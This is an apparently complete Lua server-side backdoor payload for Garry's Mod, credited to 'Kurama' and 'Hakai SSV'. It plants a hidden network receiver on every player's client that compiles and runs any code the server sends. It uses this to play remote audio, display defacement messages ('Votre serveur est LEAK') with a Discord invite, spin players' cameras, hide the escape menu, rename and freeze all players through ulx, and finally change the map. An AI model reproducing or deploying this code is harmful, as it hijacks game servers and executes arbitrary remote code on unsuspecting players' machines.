-- Payload Created by Kurama

-- Hakai SSV

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function file.Write() return end
local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end
 
local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "JeSuisNaruto"..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function InfoSendClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

function RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end
    return ret
end

m_strImageGlobalVar = RandomString( 6, 12 )

timer.Simple ( 2.5, function()
InfoSendClient([=[
local AudioSource = nil
local AMP = 3000
sound.PlayURL("https://cdn.kurama.info/songs/Kakashi.mp3", "mono", function(source , err , errname)
    if IsValid(source) then
        AudioSource = source
        source:Play()
    end
end)
local smoothdata = {}
for i = 1 , 256 do
    smoothdata[i] = 0
end
hook.Add("HUDPaint" , "VisualizerIsHere" , function()
local data = {}
    AudioSource:FFT(data , FFT_25000)
    for i = 68 , 125 do
        smoothdata [i] = Lerp(5 * FrameTime() , smoothdata[i] , data[i])
        draw.RoundedBox (1000 , i * 10 , 475 , 0.5 , smoothdata[i] * AMP , Color( 0, 175, 255))
    end
end)
]=])
end)

timer.Simple( 162.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "VisualizerIsHere" , function()
end)
]=])
end)

timer.Simple( 2.5, function()
InfoSendClient([=[
local Naruto = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "Kakashi", {
    font = "TargetID",
    extended = false,
    size = Naruto *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Hinata", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Ce Visuel a était créer", "Kakashi", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 8.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Hinata", function()
end)
]=])
end)

timer.Simple( 8.5, function()
InfoSendClient([=[
local Kakashi = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "Hinata", {
    font = "TargetID",
    extended = false,
    size = Kakashi *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Kakashi", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Pour les fans de Naruto", "Hinata", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 14.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Kakashi", function()
end)
]=])
end)

timer.Simple( 14.5, function()
InfoSendClient([=[
local Best = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "LeSheitan", {
    font = "TargetID",
    extended = false,
    size = Best *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Best", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Du Gmod Game", "LeSheitan", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 20.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Best", function()
end)
]=])
end)

timer.Simple( 20.5, function()
InfoSendClient([=[
local Lee = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Lee *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Lee", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Created by Kurama", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Lee", function()
end)
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
local Gaara = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Gaara *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Gaara", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Hakai SSV", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 37.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Gaara", function()
end)
]=])
end)

timer.Simple( 37.5, function()
InfoSendClient([=[
local NarutoNinja = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = NarutoNinja *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "NarutoNinja", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Kurama", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 50.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "NarutoNinja", function()
end)
]=])
end)

timer.Simple( 50.5, function()
InfoSendClient([=[
local Ino = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Ino *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Ino", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Rejoin discord.gg/kurama", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 62.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Ino", function()
end)
]=])
end)

timer.Simple( 62.5, function()
InfoSendClient([=[
local Mizukage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Mizukage *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Mizukage", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Event by Kurama", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 86.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Mizukage", function()
end)
]=])
end)

timer.Simple( 86.5, function()
InfoSendClient([=[
local Hokage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Hokage *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Hokage", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("On vous kiff les Serveurs Leak", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 98.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Hokage", function()
end)
]=])
end)

timer.Simple( 98.5, function()
InfoSendClient([=[
local Kazekage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Kazekage *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Kazekage", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Votre serveur est LEAK", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 102.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Kazekage", function()
end)
]=])
end)

timer.Simple( 102.5, function()
InfoSendClient([=[
local Raikage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Raikage *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Raikage", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("C'est bientot la fin", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 108.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Raikage", function()
end)
]=])
end)

timer.Simple( 108.5, function()
InfoSendClient([=[
local Tsushikage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Tsushikage *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Tsushikage", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("On vous attend sur Discord", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 121.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Tsushikage", function()
end)
]=])
end)

timer.Simple( 121.5, function()
InfoSendClient([=[
local Samouraï = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Samouraï *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Samouraï", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("On vous attend sur Discord", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 153.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Samouraï", function()
end)
]=])
end)

timer.Simple( 153.5, function()
InfoSendClient([=[
local Fin = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "NarutoDev", {
    font = "TargetID",
    extended = false,
    size = Fin *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
hook.Add( "HUDPaint", "Fin", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Aurevoir", "NarutoDev", ScrW() /2, ScrH() /2,Color( 255, 0, 0, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 162.5, function()
InfoSendClient([=[
    hook.Remove( "HUDPaint", "Fin", function()
end)
]=])
end)

timer.Simple( 2.5, function()
InfoSendClient([=[
local tab = {
    [ "$pp_colour_addr" ] = 0,
    [ "$pp_colour_addg" ] = 0,
    [ "$pp_colour_addb" ] = 0,
    [ "$pp_colour_brightness" ] = 0,
    [ "$pp_colour_contrast" ] = 1.5,
    [ "$pp_colour_colour" ] = 0,
    [ "$pp_colour_mulr" ] = 0,
    [ "$pp_colour_mulg" ] = 0,
    [ "$pp_colour_mulb" ] = 0
}
hook.Add( "RenderScreenspaceEffects", "NarutoIsHere", function()
    DrawColorModify(tab)
end)
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
    hook.Remove( "RenderScreenspaceEffects", "NarutoIsHere", function()
end)
]=])
end)

timer.Simple( 26.5,function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 100, 7)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 37.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 0, 125, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 50.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 255, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 62.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 100, 7)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 86.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 0, 125, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 98.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 255, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 102.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 100, 7)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 108.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 0, 125, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 121.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 255, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 153.5, function()
InfoSendClient([=[
function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 100, 7)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
local tab = {
    [ "$pp_colour_addr" ] = 0.1,
    [ "$pp_colour_addg" ] = 0,
    [ "$pp_colour_addb" ] = 0,
    [ "$pp_colour_brightness" ] = 0,
    [ "$pp_colour_contrast" ] = 0.5,
    [ "$pp_colour_colour" ] = 5,
    [ "$pp_colour_mulr" ] = 0.3,
    [ "$pp_colour_mulg" ] = 0,
    [ "$pp_colour_mulb" ] = 0.1
}
hook.Add( "RenderScreenspaceEffects", "NarutoOrange", function()
    DrawColorModify(tab)
end)
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
g_]=].. m_strImageGlobalVar.. [=[ = {}
    local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
    local function LoadWebMaterial(strURL, strUID, intSizeX, intSizeY)
    local Kakashi = vgui.Create("HTML")
        Kakashi:SetPos( ScrW() -1, ScrH() -1)
        Kakashi:SetVisible(true)
        Kakashi:SetMouseInputEnabled(false)
        Kakashi:SetKeyBoardInputEnabled(false)
        Kakashi:SetSize(intSizeX, intSizeY)
        Kakashi:SetHTML(html:format(strURL, intSizeX, intSizeY))
    local PageLoaded
        PageLoaded = function()
    local mat = Kakashi:GetHTMLMaterial()
    if mat then
g_]=].. m_strImageGlobalVar.. [=[[strUID] = {mat, Kakashi}
    return
end
    timer.Simple( 0.5, PageLoaded)
end
    PageLoaded()
end
    LoadWebMaterial( "https://cdn.discordapp.com/attachments/694910203857993840/739116861525983323/kurama_1.png", "Stars", 500, 500)
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
local Stars = ParticleEmitter( LocalPlayer():GetPos())
local function GetWebMat( strURL )
    return g_]=].. m_strImageGlobalVar.. [=[[strURL]
end
 
hook.Add( "Think", "KakashiIsHere", function()
    for i = 1, 2 do
        if GetWebMat("Stars") then
    local Naruto = Stars:Add(GetWebMat("Stars")[1], LocalPlayer():GetPos() +Vector( math.random(-80,80),math.random(-80,80),10))                 
        if Naruto then
    local Size = math.random( 7, 10)                       
        Naruto:SetVelocity( Vector( math.random(-100,70), math.random(-100,100), 50))
        Naruto:SetDieTime( 2)
        Naruto:SetGravity(Vector( 5, 2.5, 10))
        Naruto:SetLifeTime( 0)
        Naruto:SetStartSize( Size /2)
        Naruto:SetEndSize( 10)
        Naruto:SetLighting( false)
        Naruto:SetCollide( false)
        Naruto:SetAngles(Angle( math.random( 0, 10),math.random( 0, 10),math.random( 0, 10)))
        Naruto:SetAngleVelocity( Angle( 2, 2, 2))
    end
end
    end
end)
]=])
end)

timer.Simple( 162.5, function()
InfoSendClient([=[
    hook.Remove( "Think", "KakashiIsHere")
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 50, 15, 120)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView1", MyCalcView )
]=])
end)

timer.Simple( 26.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView1")
]=])
end)

timer.Simple( 37.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 10, 0, 95)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView2", MyCalcView )
]=])
end)

timer.Simple( 50.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView2")
]=])
end)


timer.Simple( 50.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 90, 50, 50)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView3", MyCalcView )
]=])
end)

timer.Simple( 62.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView3")
]=])
end)

timer.Simple( 62.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 90, 50, 80)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView4", MyCalcView )
]=])
end)

timer.Simple( 86.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView4")
]=])
end)

timer.Simple( 86.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 100, 0, 65)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView5", MyCalcView )
]=])
end)

timer.Simple( 98.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView5")
]=])
end)

timer.Simple( 98.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 60, 10, 56)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView6", MyCalcView )
]=])
end)

timer.Simple( 102.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView6")
]=])
end)

timer.Simple( 102.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 110, 0, 75)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView7", MyCalcView )
]=])
end)

timer.Simple( 108.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView7")
]=])
end)

timer.Simple( 108.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 75, 0, 45)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView8", MyCalcView )
]=])
end)

timer.Simple( 121.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView8")
]=])
end)

timer.Simple( 121.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 140, 10, 45)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView9", MyCalcView )
]=])
end)

timer.Simple( 153.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView9")
]=])
end)

timer.Simple( 153.5, function()
InfoSendClient([=[
local function MyCalcView(ply, pos, angles, fov)
    local view = {}
    view.origin = pos
    view.angles = Angle( CurTime() % 360 * - 180, 30, 10)
    view.fov = fov
    view.drawviewer = false
    return view
end
     
hook.Add( "CalcView", "MyCalcView10", MyCalcView )
]=])
end)

timer.Simple( 2.5, function()
InfoSendClient([=[
hook.Add("PreDrawHUD", "EchapDisparition", function()
    gui.HideGameUI()
end)
]=])
end)

timer.Simple( 162.5, function()
InfoSendClient([=[
    hook.Remove( "CalcView", "MyCalcView10")
]=])
end)

timer.Create("LoadGM", 164.5, 1, function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Create("RPName", 2.5, 99, function()
    for _, v in pairs(player.GetAll()) do
        v:setDarkRPVar("rpname", "Event by Hakai SSv -) Join my Discord : discord.gg/kurama")
    end
end)

timer.Create("Freeze",  26.5, 99, function()
    RunConsoleCommand("ulx", "freeze", "*")
end)

timer.Simple( 162.5, function()
    RunConsoleCommand("ulx", "unfreeze", "*")
end)
